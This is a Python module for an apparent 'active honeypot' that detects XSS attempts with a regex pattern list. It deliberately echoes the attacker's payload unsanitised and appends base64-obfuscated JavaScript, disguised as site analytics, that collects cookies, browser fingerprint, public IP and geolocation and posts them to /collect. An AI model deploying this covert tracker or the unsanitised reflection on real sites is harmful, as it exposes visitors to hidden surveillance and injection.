# xss_handler.py
import re
from dataclasses import dataclass
from typing import List

@dataclass
class XSSAttackInfo:
    raw_payload:    str
    xss_type:       str    # 'reflected'/'stored'/'dom'
    payload_intent: str    # 'cookie_steal'/'defacement'/'probe'
    injected_code:  str    # Code thực sự được inject vào page
    trap_code:      str    # Code bẫy thêm vào để thu thập thông tin

class XSSHandler:
    """
    Xử lý tấn công XSS theo kỹ thuật Active Honeypot

    Chiến lược đặc biệt:
    - KHÔNG sanitize XSS payload của kẻ tấn công
    - THỰC THI code của họ ngay trên browser của chính họ
    - THÊM mã bẫy để thu thập thông tin định danh
    - Kẻ tấn công vô tình tự báo cáo thông tin về mình!
    """

    XSS_PATTERNS = [
        r"<script[^>]*>.*?</script>",
        r"javascript:",
        r"onerror\s*=",
        r"onload\s*=",
        r"onclick\s*=",
        r"onmouseover\s*=",
        r"<img[^>]*src[^>]*onerror",
        r"<svg[^>]*onload",
        r"alert\s*\(",
        r"document\.cookie",
        r"document\.write",
        r"eval\s*\(",
        r"<iframe",
        r"<object",
        r"<embed",
    ]

    def __init__(self):
        self.attack_log: List[XSSAttackInfo] = []

    def _detect_xss_type(self, payload: str) -> str:
        if "document.cookie" in payload.lower():
            return "Reflected XSS - Cookie Theft"
        elif "document.write" in payload.lower():
            return "Reflected XSS - Page Defacement"
        elif "alert(" in payload.lower():
            return "Reflected XSS - Probe/Test"
        elif "window.location" in payload.lower():
            return "DOM-based XSS - Redirect"
        return "Reflected XSS - Generic"

    def _detect_intent(self, payload: str) -> str:
        payload_lower = payload.lower()
        if "cookie" in payload_lower:
            return "Cookie/Session Theft"
        elif "alert" in payload_lower:
            return "Vulnerability Probe"
        elif "location" in payload_lower:
            return "Redirect/Phishing"
        elif "document.write" in payload_lower:
            return "Page Defacement"
        return "Unknown Intent"

    def _generate_trap_code(self) -> str:
        """
        Mã JavaScript bẫy - được obfuscate để khó phát hiện
        Thu thập: browser info, screen, plugins, cookie, geolocation
        Gửi về honeypot server để phân tích
        """
        # Code gốc (trước khi obfuscate)
        trap_js_clear = """
        (function() {
            var _fp = {
                ua:      navigator.userAgent,
                lang:    navigator.language,
                platform:navigator.platform,
                screen:  screen.width + 'x' + screen.height,
                tz:      Intl.DateTimeFormat().resolvedOptions().timeZone,
                plugins: Array.from(navigator.plugins).map(p=>p.name).join(','),
                cookie:  document.cookie,
                referrer:document.referrer,
                title:   document.title,
                url:     window.location.href,
                ts:      new Date().toISOString()
            };

            // Lấy địa chỉ IP công khai (nhờ API bên ngoài)
            fetch('https://api.ipify.org?format=json')
                .then(r => r.json())
                .then(d => {
                    _fp.public_ip = d.ip;
                    // Gửi về honeypot
                    fetch('/collect', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify(_fp)
                    });
                });

            // Thử lấy geolocation
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(pos) {
                    fetch('/collect', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            lat: pos.coords.latitude,
                            lon: pos.coords.longitude,
                            acc: pos.coords.accuracy
                        })
                    });
                });
            }
        })();
        """

        # Versi obfuscated (base64 encode để khó đọc)
        import base64
        encoded = base64.b64encode(
            trap_js_clear.encode()
        ).decode()

        # Wrapper obfuscated
        trap_obfuscated = f"""
        <script>
        /* Site analytics v2.1 */
        var _0x1a2b = atob('{encoded}');
        eval(_0x1a2b);
        </script>"""

        return trap_obfuscated

    def is_xss_attempt(self, payload: str) -> bool:
        return any(
            re.search(p, payload, re.I | re.S)
            for p in self.XSS_PATTERNS
        )

    def handle(self, payload: str,
               page: str = "komentar") -> tuple:
        """
        Kỹ thuật đặc biệt:
        1. THỰC THI payload gốc của kẻ tấn công
        2. THÊM mã bẫy để thu thập fingerprint
        3. Trả về trang có CẢ HAI
        """
        xss_type = self._detect_xss_type(payload)
        intent   = self._detect_intent(payload)
        trap     = self._generate_trap_code()

        # Trang kết quả: payload của họ + mã bẫy của ta
        injected_page = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>Komentar - BeritaHariIni.co.id</title>
            <meta charset="UTF-8">
        </head>
        <body>
            <h2>Komentar Pembaca</h2>
            <div class="comment">
                <p><b>Pengguna Anonim</b> menulis:</p>
                <!-- Payload kẻ tấn công được thực thi tại đây -->
                <p>{payload}</p>
            </div>
            <!-- Analytics (mã bẫy ẩn) -->
            {trap}
        </body>
        </html>"""

        info = XSSAttackInfo(
            raw_payload   = payload,
            xss_type      = xss_type,
            payload_intent= intent,
            injected_code = payload,
            trap_code     = trap,
        )
        self.attack_log.append(info)
        return info, injected_page